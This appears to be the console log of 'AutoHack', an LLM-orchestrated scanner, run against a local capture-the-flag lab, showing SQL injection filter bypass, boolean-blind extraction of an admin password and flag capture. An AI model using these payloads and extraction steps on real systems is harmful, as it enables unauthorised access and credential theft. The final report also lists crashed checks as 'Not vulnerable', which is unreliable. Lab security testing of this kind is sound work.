@@ -1,0 +1,341 @@
+╔══════════════════════════════════════════════════════╗
+║      AutoHack - Intelligent Security Testing        ║
+╚══════════════════════════════════════════════════════╝
+
+Target: http://127.0.0.1:8080
+Mode: 🤖 Intelligent Orchestration (aggressive)
+Decision: LLM-driven
+Memory: ✓
+Reasoning: ✓
+LLM Provider: Google Gemini (AI Studio)
+
+Running scan...
+
+time="2026-10-29T17:31:45+07:00" level=warning msg="The \"AWS_ACCESS_KEY_ID\" variable is not set. Defaulting to a blank string."
+time="2026-10-29T17:31:45+07:00" level=warning msg="The \"AWS_SECRET_ACCESS_KEY\" variable is not set. Defaulting to a blank string."
+time="2026-10-29T17:31:45+07:00" level=warning msg="The \"AWS_SESSION_TOKEN\" variable is not set. Defaulting to a blank string."
+time="2026-10-29T17:31:45+07:00" level=warning msg="The \"OPENROUTER_API_KEY\" variable is not set. Defaulting to a blank string."
+time="2026-10-29T17:31:45+07:00" level=warning msg="The \"GOOGLE_API_KEY\" variable is not set. Defaulting to a blank string."
+time="2026-10-29T17:31:45+07:00" level=warning msg="C:\\Users\\dqphu\\Downloads\\New folder\\KMA\\Kì 3\\Kiểm thử ATTT\\awe-experiment\\awe\\docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+time="2026-10-29T17:31:45+07:00" level=warning msg="C:\\Users\\dqphu\\Downloads\\New folder\\KMA\\Kì 3\\Kiểm thử ATTT\\awe-experiment\\awe\\docker-compose.override.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion"
+ Container awe-stuxlab-run-f80dbb2ffb9d Creating 
+ Container awe-stuxlab-run-f80dbb2ffb9d Created 
+WARNING:root:Persistence module not available - OAST functionality will be limited
+
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                           AutoHack Agent v2.5                               ║
+║                 Multi-Vulnerability Detection & Exploitation                 ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  XSS Detection: Reflected, Stored, Blind, DOM (Source/Sink + LLM)          ║
+║  SQLi Detection: Error-based, Time-based, Boolean-based, UNION-based        ║
+║  SSTI Detection: Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, ERB     ║
+║  XXE Detection: XML External Entity, File disclosure, SOAP endpoints        ║
+║  Command Injection: Output-based, Timing-based, Multiple techniques         ║
+║  LFI/Path Traversal: Directory traversal, File inclusion detection          ║
+║  IDOR Detection: Context-aware, LLM-driven authorization testing            ║
+║  SSRF Detection: Localhost bypass, cloud metadata, internal services        ║
+║  Default Credentials: Form detection + 14M password wordlist testing        ║
+║  Information Disclosure: API keys, secrets, flags, sensitive data           ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+    
+🧠 Reasoning transparency enabled (mode: verbose)
+📁 Reasoning logs will be saved to: logs/reasoning/
+💾 Agent memory enabled
+📊 Memory database: memory/agent_memory.db
+📈 Memory contains: 0 attempts, 0 filters, 0 bypasses
+🤖 Intelligent Orchestration mode (aggressive)
+
+======================================================================
+🤖 INTELLIGENT ORCHESTRATION
+======================================================================
+Target: http://127.0.0.1:8080
+Mode: aggressive
+======================================================================
+
+📡 Phase 1: Reconnaissance
+----------------------------------------------------------------------
+Crawling target (depth=3, max_urls=50)...
+2026-10-29 10:31:48,285 - IntelligentOrchestrator - INFO - Starting intelligent orchestration for http://127.0.0.1:8080
+✓ Discovered 4 pages, 2 forms
+
+✓ Reconnaissance Complete (1.5s)
+
+Found:
+  ✓ 1 login form(s) → Will test: Default Credentials, SQLi
+  ✓ 2 parameter(s) with user input → Will test: XSS, SQLi
+
+Attack Surface Score: 3/10 (Low)
+
+🧠 Phase 2: Agent Selection
+----------------------------------------------------------------------
+Analyzing with LLM... Gemini Rate limit hit (attempt 1/3). Retrying in 1.0s...
+Gemini Rate limit hit (attempt 2/3). Retrying in 2.0s...
+2026-10-29 10:31:54,148 - IntelligentOrchestrator - ERROR - LLM agent decision failed: Gemini Rate limit exceeded after 3 attempts
+2026-10-29 10:31:54,149 - IntelligentOrchestrator - WARNING - LLM decision failed, falling back to rules: Gemini Rate limit exceeded after 3 attempts
+
+✓ Agent Selection Complete (4.4s)
+
+🔴 Priority 1 (Must Run): default_credentials, sqli, xss
+   • default_credentials: Found 1 login form(s)
+   • sqli: Login forms present, testing for SQL injection
+   • xss: Found 2 input parameter(s)
+
+🟢 Priority 3 (Optional): info_disclosure, idor
+   • info_disclosure: Checking for exposed secrets/API keys
+   • idor: Authentication detected, testing authorization
+
+Estimated Time: 3-6 minutes
+Estimated Cost: $0.60-$1.20
+
+⚡ Phase 3: Execution
+----------------------------------------------------------------------
+
+🔴 Priority 1 (Critical): default_credentials, sqli, xss
+
+  ⚡ default_credentials: Starting...
+  ✗ default_credentials: Error - 'CredentialTester' object has no attribute 'test_url' [0.0s]
+
+  ⚡ sqli: Starting...
+2026-10-29 10:31:54,153 - IntelligentOrchestrator - ERROR - Agent default_credentials failed: 'CredentialTester' object has no attribute 'test_url'
+2026-10-29 10:31:54,154 - SQLiOrchestrator - INFO - [INIT] use_hybrid parameter: False
+2026-10-29 10:31:54,155 - SQLiOrchestrator - INFO - [INIT] HYBRID_AVAILABLE: True
+2026-10-29 10:31:54,156 - SQLiOrchestrator - INFO - [INIT] Final self.use_hybrid: False
+2026-10-29 10:31:54,335 - NucleiSQLiScanner - INFO - Nuclei templates not found - downloading...
+2026-10-29 10:32:04,181 - NucleiSQLiScanner - INFO - Nuclei templates updated successfully
+2026-10-29 10:32:04,189 - SQLiOrchestrator - ERROR - Failed to load payload database: [Errno 2] No such file or directory: '/app/src/sqli_agent/analysis_framework/payloads_db.json'
+2026-10-29 10:32:04,190 - SQLiOrchestrator - INFO - Starting SQL injection testing on http://127.0.0.1:8080
+2026-10-29 10:32:04,192 - SQLiOrchestrator - INFO - Configuration: 30 max attempts
+2026-10-29 10:32:04,194 - SQLiOrchestrator - INFO - Step 0: Nuclei scan disabled (for speed)
+2026-10-29 10:32:04,196 - SQLiOrchestrator - INFO - Nuclei did not detect SQLi - continuing with manual testing
+2026-10-29 10:32:04,198 - SQLiOrchestrator - INFO - Step 0.5: Performing SAST analysis (intelligence gathering)...
+2026-10-29 10:32:04,199 - SQLiSASTAnalyzer - INFO - [SAST] Starting static analysis on http://127.0.0.1:8080
+
+  ⚡ xss: Starting...
+2026-10-29 10:32:04,213 - DynamicXSSOrchestrator - WARNING - OAST agent not available - continuing without OAST testing
+2026-10-29 10:32:04,216 - DynamicXSSOrchestrator - INFO - Starting dynamic XSS verification for http://127.0.0.1:8080
+2026-10-29 10:32:04,217 - ReconAgent - INFO - Starting reconnaissance on http://127.0.0.1:8080
+2026-10-29 10:32:04,221 - src.xss_agent.utils.nuclei_runner - INFO - Running Nuclei against http://127.0.0.1:8080
+2026-10-29 10:34:04,269 - src.xss_agent.utils.nuclei_runner - ERROR - Nuclei scan timeout after 120 seconds
+2026-10-29 10:34:04,271 - ReconAgent - ERROR - Failed to run Nuclei
+2026-10-29 10:34:04,273 - DynamicXSSOrchestrator - INFO - Discovering forms for stored XSS testing
+2026-10-29 10:34:04,276 - FormDiscoveryAgent - INFO - Discovering forms on http://127.0.0.1:8080
+2026-10-29 10:34:04,698 - SQLiSASTAnalyzer - INFO - [SAST] Analyzing HTML...
+2026-10-29 10:34:04,700 - SQLiSASTAnalyzer - INFO - [SAST] Analyzing JavaScript...
+2026-10-29 10:34:04,709 - SQLiSASTAnalyzer - INFO - [SAST] Checking for API documentation...
+2026-10-29 10:34:04,878 - SQLiSASTAnalyzer - INFO - [SAST] Checking common files...
+2026-10-29 10:34:05,024 - SQLiSASTAnalyzer - INFO - [SAST] Fingerprinting database...
+2026-10-29 10:34:05,155 - SQLiSASTAnalyzer - INFO - [SAST] Detecting framework...
+2026-10-29 10:34:05,169 - SQLiSASTAnalyzer - INFO - [SAST] Analysis complete
+2026-10-29 10:34:05,173 - SQLiSASTAnalyzer - INFO - 
+=== SAST Intelligence Profile ===
+2026-10-29 10:34:05,224 - SQLiOrchestrator - INFO - Step 1: Discovering injectable parameters...
+2026-10-29 10:34:05,225 - ParameterDiscoveryAgent - INFO - Discovering parameters from http://127.0.0.1:8080
+2026-10-29 10:34:05,273 - FormDiscoveryAgent - INFO - Discovered 0 potential XSS forms
+2026-10-29 10:34:05,275 - DynamicXSSOrchestrator - WARNING - No XSS vulnerabilities found by Nuclei or form testing
+2026-10-29 10:34:05,281 - DynamicXSSOrchestrator - INFO - Results saved to ./dynamic_xss_results.json
+2026-10-29 10:34:05,286 - DynamicXSSOrchestrator - INFO - Results saved to ./results/dynamic_xss_results.json
+2026-10-29 10:34:05,287 - DynamicXSSOrchestrator - INFO - Results saved to ./dynamic_xss_results.json and ./results/dynamic_xss_results.json
+  ✓ xss: Not vulnerable [121.1s]
+2026-10-29 10:34:07,636 - ParameterDiscoveryAgent - INFO - Found 0 form(s) on page
+2026-10-29 10:34:07,650 - ParameterDiscoveryAgent - INFO - Analyzing 0 script(s) for fetch/AJAX calls...
+2026-10-29 10:34:07,651 - ParameterDiscoveryAgent - INFO - Testing for GraphQL endpoints...
+2026-10-29 10:34:07,716 - ParameterDiscoveryAgent - INFO - Found 2 interesting link(s) to follow
+2026-10-29 10:34:07,718 - ParameterDiscoveryAgent - INFO -   Following: http://127.0.0.1:8080/search.php
+2026-10-29 10:34:08,772 - ParameterDiscoveryAgent - INFO -     Found 1 form(s) on linked page
+2026-10-29 10:34:08,852 - ParameterDiscoveryAgent - INFO -       + username (post, text)
+2026-10-29 10:34:08,853 - ParameterDiscoveryAgent - INFO -   Following: http://127.0.0.1:8080/login.php
+2026-10-29 10:34:09,920 - ParameterDiscoveryAgent - INFO -     Found 1 form(s) on linked page
+2026-10-29 10:34:09,985 - ParameterDiscoveryAgent - INFO -       + username (post, text)
+2026-10-29 10:34:10,011 - ParameterDiscoveryAgent - INFO -       + password (post, password)
+2026-10-29 10:34:10,074 - ParameterDiscoveryAgent - INFO - Discovered 3 injection points:
+2026-10-29 10:34:10,076 - ParameterDiscoveryAgent - INFO -   - username (post, type: string)
+2026-10-29 10:34:10,077 - ParameterDiscoveryAgent - INFO -   - username (post, type: string)
+2026-10-29 10:34:10,078 - ParameterDiscoveryAgent - INFO -   - password (post, type: string)
+2026-10-29 10:34:10,079 - SQLiOrchestrator - INFO - Found 3 potential injection points
+2026-10-29 10:34:10,080 - SQLiOrchestrator - INFO - Step 1.5: Detecting input filters and testing bypass techniques...
+2026-10-29 10:34:10,099 - SQLiFilterDetector - INFO - [Filter Detection] Testing for input filters...
+2026-10-29 10:34:10,103 - SQLiFilterDetector - INFO -   [REMOVED] SELECT had no effect (stripped)
+2026-10-29 10:34:10,107 - SQLiFilterDetector - INFO -   [REMOVED] UNION had no effect (stripped)
+2026-10-29 10:34:10,111 - SQLiFilterDetector - INFO -   [REMOVED] OR had no effect (stripped)
+2026-10-29 10:34:10,114 - SQLiFilterDetector - INFO -   [REMOVED] AND had no effect (stripped)
+2026-10-29 10:34:10,117 - SQLiFilterDetector - INFO -   [REMOVED] FROM had no effect (stripped)
+2026-10-29 10:34:10,121 - SQLiFilterDetector - INFO -   [REMOVED] WHERE had no effect (stripped)
+2026-10-29 10:34:10,124 - SQLiFilterDetector - INFO -   [REMOVED] INSERT had no effect (stripped)
+2026-10-29 10:34:10,127 - SQLiFilterDetector - INFO -   [REMOVED] UPDATE had no effect (stripped)
+2026-10-29 10:34:10,131 - SQLiFilterDetector - INFO -   [REMOVED] DELETE had no effect (stripped)
+2026-10-29 10:34:10,134 - SQLiFilterDetector - INFO -   [REMOVED] DROP had no effect (stripped)
+2026-10-29 10:34:10,137 - SQLiFilterDetector - INFO -   [REMOVED] EXEC had no effect (stripped)
+2026-10-29 10:34:10,138 - SQLiFilterDetector - INFO - [Filter Detection] Detected keyword_removal
+2026-10-29 10:34:10,139 - SQLiFilterDetector - INFO -   Blocked keywords: SELECT, UNION, OR, AND, FROM
+2026-10-29 10:34:10,140 - SQLiFilterDetector - INFO - [Bypass Testing] Testing bypass techniques...
+2026-10-29 10:34:10,141 - SQLiFilterDetector - INFO -   Testing: Case mixing (SeLeCt)
+2026-10-29 10:34:10,145 - SQLiFilterDetector - INFO -     ✓ SELECT → SeLeCt works!
+2026-10-29 10:34:10,146 - SQLiFilterDetector - INFO -   ✅ Case mixing bypasses filter!
+2026-10-29 10:34:10,147 - SQLiOrchestrator - INFO - ✓ Filter detected: keyword_removal
+2026-10-29 10:34:10,148 - SQLiOrchestrator - INFO -   Blocked keywords: SELECT, UNION, OR, AND, FROM
+2026-10-29 10:34:10,149 - SQLiOrchestrator - INFO -   ✓ Bypass found: case_mixing
+2026-10-29 10:34:10,150 - SQLiOrchestrator - INFO -   Examples: [('SELECT', 'SeLeCt')]
+2026-10-29 10:34:10,151 - SQLiOrchestrator - INFO - 
+================================================================================
+2026-10-29 10:34:10,151 - SQLiOrchestrator - INFO - Testing parameter: username
+2026-10-29 10:34:10,152 - SQLiOrchestrator - INFO - ================================================================================
+
+2026-10-29 10:34:10,153 - SQLiOrchestrator - INFO - [AGGRESSIVE TESTING] Fast SQLMap-style testing on username
+2026-10-29 10:34:10,154 - SQLiOrchestrator - INFO -    Mode: AGGRESSIVE (Error→UNION→Boolean→Time)
+2026-10-29 10:34:10,155 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Starting fast SQLMap-style testing on username
+2026-10-29 10:34:10,155 - AggressiveSQLiVerifier - INFO - [BYPASS] Filter bypass enabled: case_mixing
+2026-10-29 10:34:10,473 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 1/5: Error-based detection (2s)
+2026-10-29 10:34:10,474 - AggressiveSQLiVerifier - INFO - [ERROR-BASED] Attempting data extraction via EXTRACTVALUE/UPDATEXML...
+2026-10-29 10:34:10,475 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.flag...
+2026-10-29 10:34:10,480 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.value...
+2026-10-29 10:34:10,487 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.token...
+2026-10-29 10:34:10,492 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.data...
+2026-10-29 10:34:10,497 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.flag...
+2026-10-29 10:34:10,501 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.value...
+2026-10-29 10:34:10,505 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.token...
+2026-10-29 10:34:10,510 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flags.data...
+2026-10-29 10:34:10,514 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.secret...
+2026-10-29 10:34:10,518 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.value...
+2026-10-29 10:34:10,524 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying secrets.data...
+2026-10-29 10:34:10,528 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.password...
+2026-10-29 10:34:10,533 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.email...
+2026-10-29 10:34:10,538 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying users.username...
+2026-10-29 10:34:10,543 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.password...
+2026-10-29 10:34:10,548 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.email...
+2026-10-29 10:34:10,553 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying admin.username...
+2026-10-29 10:34:10,558 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 2/5: UNION-based detection (10s)
+2026-10-29 10:34:10,565 - AggressiveSQLiVerifier - INFO - [UNION] ✓ Found 1 columns (no error, stable response)
+2026-10-29 10:34:10,567 - AggressiveSQLiVerifier - INFO - [✓✓✓] UNION-BASED SQLi found!
+2026-10-29 10:34:10,568 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting database version...
+2026-10-29 10:34:10,574 - AggressiveSQLiVerifier - INFO - [EXTRACT] Getting current database...
+2026-10-29 10:34:10,577 - AggressiveSQLiVerifier - INFO - [EXTRACT] ✓ Database: You
+2026-10-29 10:34:10,578 - AggressiveSQLiVerifier - INFO - [EXTRACT] Attempting direct data extraction from common tables...
+2026-10-29 10:34:10,580 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flag'...
+2026-10-29 10:34:10,594 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'flags'...
+2026-10-29 10:34:10,607 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'jobs'...
+2026-10-29 10:34:10,619 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'posts'...
+2026-10-29 10:34:10,633 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'items'...
+2026-10-29 10:34:10,646 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'users'...
+2026-10-29 10:34:10,658 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'admin'...
+2026-10-29 10:34:10,671 - AggressiveSQLiVerifier - INFO - [EXTRACT] Trying table 'secrets'...
+2026-10-29 10:34:10,682 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] UNION found SQLi but no FLAG - continuing to Boolean for auth bypass...
+2026-10-29 10:34:10,683 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3/5: Boolean-based detection (15s)
+2026-10-29 10:34:10,686 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Baseline length: 357
+2026-10-29 10:34:10,687 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1
+2026-10-29 10:34:10,690 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 77
+2026-10-29 10:34:10,691 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2
+2026-10-29 10:34:10,694 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 77
+2026-10-29 10:34:10,694 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: ' Or '1'='1'-- -
+2026-10-29 10:34:10,698 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 77
+2026-10-29 10:34:10,699 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: ' AnD '1'='2'-- -
+2026-10-29 10:34:10,701 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 77
+2026-10-29 10:34:10,702 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing TRUE: admin' Or '1'='1'-- -
+2026-10-29 10:34:10,704 - AggressiveSQLiVerifier - INFO - [BOOLEAN] TRUE response length: 77
+2026-10-29 10:34:10,705 - AggressiveSQLiVerifier - INFO - [BOOLEAN] Testing FALSE: admin' AnD '1'='2'-- -
+2026-10-29 10:34:10,708 - AggressiveSQLiVerifier - INFO - [BOOLEAN] FALSE response length: 77
+2026-10-29 10:34:10,709 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 3.5/6: Boolean blind character extraction (30s)
+2026-10-29 10:34:10,709 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Testing character extraction with MID() and ASCII()...
+2026-10-29 10:34:10,711 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Search endpoint detected - testing via query parameters (GET)
+2026-10-29 10:34:10,819 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] ✓ Working condition: xxx"||LENGTH(password)>0||"
+2026-10-29 10:34:10,820 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] ✓✓ Detected boolean blind SQLi!
+2026-10-29 10:34:10,821 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Starting password extraction...
+2026-10-29 10:34:12,605 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 1: 'T' (ASCII 84)
+2026-10-29 10:34:12,606 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: T
+2026-10-29 10:34:15,103 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 2: 'h' (ASCII 104)
+2026-10-29 10:34:15,104 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: Th
+2026-10-29 10:34:17,678 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 3: 'i' (ASCII 105)
+2026-10-29 10:34:17,679 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: Thi
+2026-10-29 10:34:20,845 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 4: 's' (ASCII 115)
+2026-10-29 10:34:20,846 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: This
+2026-10-29 10:34:22,680 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 5: 'I' (ASCII 73)
+2026-10-29 10:34:22,681 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisI
+2026-10-29 10:34:26,670 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 6: 's' (ASCII 115)
+2026-10-29 10:34:26,672 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIs
+2026-10-29 10:34:28,743 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 7: 'B' (ASCII 66)
+2026-10-29 10:34:28,745 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsB
+2026-10-29 10:34:33,116 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 8: 'e' (ASCII 101)
+2026-10-29 10:34:33,118 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBe
+2026-10-29 10:34:38,897 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 9: 's' (ASCII 115)
+2026-10-29 10:34:38,899 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBes
+2026-10-29 10:34:45,287 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 10: 't' (ASCII 116)
+2026-10-29 10:34:45,289 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBest
+2026-10-29 10:34:49,456 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 11: 'P' (ASCII 80)
+2026-10-29 10:34:49,459 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestP
+2026-10-29 10:34:55,490 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 12: 'a' (ASCII 97)
+2026-10-29 10:34:55,491 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestPa
+2026-10-29 10:35:03,475 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 13: 's' (ASCII 115)
+2026-10-29 10:35:03,476 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestPas
+2026-10-29 10:35:12,023 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 14: 's' (ASCII 115)
+2026-10-29 10:35:12,024 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestPass
+2026-10-29 10:35:18,085 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 15: 'w' (ASCII 119)
+2026-10-29 10:35:18,087 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestPassw
+2026-10-29 10:35:22,109 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 16: 'o' (ASCII 111)
+2026-10-29 10:35:22,111 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestPasswo
+2026-10-29 10:35:26,778 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 17: 'r' (ASCII 114)
+2026-10-29 10:35:26,780 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestPasswor
+2026-10-29 10:35:30,934 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Position 18: 'd' (ASCII 100)
+2026-10-29 10:35:30,936 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Extracted so far: ThisIsBestPassword
+2026-10-29 10:35:37,598 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] ✓ Password extraction complete: ThisIsBestPassword
+2026-10-29 10:35:37,599 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] Searching for login endpoint...
+2026-10-29 10:35:37,604 - AggressiveSQLiVerifier - INFO - [BOOLEAN-BLIND] ✓✓✓ FLAG FOUND via login!
+2026-10-29 10:35:37,605 - AggressiveSQLiVerifier - INFO -     Username: admin
+2026-10-29 10:35:37,607 - AggressiveSQLiVerifier - INFO -     Password: ThisIsBestPassword
+2026-10-29 10:35:37,608 - AggressiveSQLiVerifier - INFO -     → FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
+2026-10-29 10:35:37,609 - AggressiveSQLiVerifier - INFO - [✓✓✓] BOOLEAN-BLIND EXTRACTION successful!
+2026-10-29 10:35:37,610 - AggressiveSQLiVerifier - INFO - [✓✓✓] FLAG extracted via login!
+2026-10-29 10:35:37,699 - SQLiOrchestrator - INFO - [✓✓✓] AGGRESSIVE MODE: Found boolean_blind_extraction SQLi!
+2026-10-29 10:35:37,701 - SQLiOrchestrator - INFO -     Confidence: 95%
+2026-10-29 10:35:37,702 - SQLiOrchestrator - INFO - [✓✓✓] DATA EXTRACTED:
+2026-10-29 10:35:37,704 - SQLiOrchestrator - INFO -     password: ThisIsBestPassword
+2026-10-29 10:35:37,705 - SQLiOrchestrator - INFO -     username: admin
+2026-10-29 10:35:37,706 - SQLiOrchestrator - INFO -     login_url: http://127.0.0.1:8080/login.php
+2026-10-29 10:35:37,707 - SQLiOrchestrator - INFO -     flag: FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
+2026-10-29 10:35:37,709 - SQLiOrchestrator - INFO - ✓ VULNERABLE: username
+2026-10-29 10:35:37,710 - SQLiOrchestrator - INFO -   Type: boolean_blind
+2026-10-29 10:35:37,711 - SQLiOrchestrator - INFO -   Database: mysql
+2026-10-29 10:35:37,712 - SQLiOrchestrator - INFO -   Confidence: 95%
+2026-10-29 10:35:37,713 - SQLiOrchestrator - INFO -   🚩 FLAG FOUND: FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
+2026-10-29 10:35:37,714 - SQLiOrchestrator - INFO -   🚩 FLAG FOUND: FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
+2026-10-29 10:35:37,715 - SQLiOrchestrator - INFO -   🎯 FLAG captured - stopping further tests
+  🎯 sqli: VULNERABLE (1 finding(s)) [223.6s]
+
+🟢 Priority 3 (Medium): info_disclosure, idor
+
+  ⚡ info_disclosure: Starting...
+2026-10-29 10:35:37,942 - httpx - INFO - HTTP Request: GET http://127.0.0.1:8080 "HTTP/1.1 200 OK"
+2026-10-29 10:35:37,953 - httpx - INFO - HTTP Request: GET http://127.0.0.1:8080/secret.txt "HTTP/1.1 404 Not Found"
+2026-10-29 10:35:37,965 - httpx - INFO - HTTP Request: GET http://127.0.0.1:8080/flag.txt "HTTP/1.1 404 Not Found"
+2026-10-29 10:35:37,976 - httpx - INFO - HTTP Request: GET http://127.0.0.1:8080/.env "HTTP/1.1 404 Not Found"
+2026-10-29 10:35:37,985 - httpx - INFO - HTTP Request: GET http://127.0.0.1:8080/robots.txt "HTTP/1.1 404 Not Found"
+2026-10-29 10:35:37,996 - httpx - INFO - HTTP Request: GET http://127.0.0.1:8080/challenge "HTTP/1.1 404 Not Found"
+2026-10-29 10:35:38,005 - httpx - INFO - HTTP Request: GET http://127.0.0.1:8080/api "HTTP/1.1 404 Not Found"
+  ✓ info_disclosure: Not vulnerable [0.3s]
+
+  ⚡ idor: Starting...
+  ✗ idor: Error - ContextAwareIDOROrchestrator.__init__() missing 1 required positional argument: 'llm_client' [0.0s]
+
+======================================================================
+📊 FINAL REPORT
+======================================================================
+
+Agents Run: 5
+Vulnerabilities Found: 1
+Total Time: 229.7s
+  - Reconnaissance: 1.5s
+  - Decision: 4.4s
+  - Execution: 223.9s
+
+----------------------------------------------------------------------
+Findings:
+----------------------------------------------------------------------
+default_credentials  ✓ Not vulnerable     (0.0s)
+xss                  ✓ Not vulnerable     (121.1s)
+sqli                 🎯 VULNERABLE         (223.6s)
+  → 1 vulnerability/ies found
+info_disclosure      ✓ Not vulnerable     (0.3s)
+idor                 ✓ Not vulnerable     (0.0s)
+
+======================================================================
+2026-10-29 10:35:38,013 - IntelligentOrchestrator - ERROR - Agent idor failed: ContextAwareIDOROrchestrator.__init__() missing 1 required positional argument: 'llm_client'
+
+✓ Scan complete!
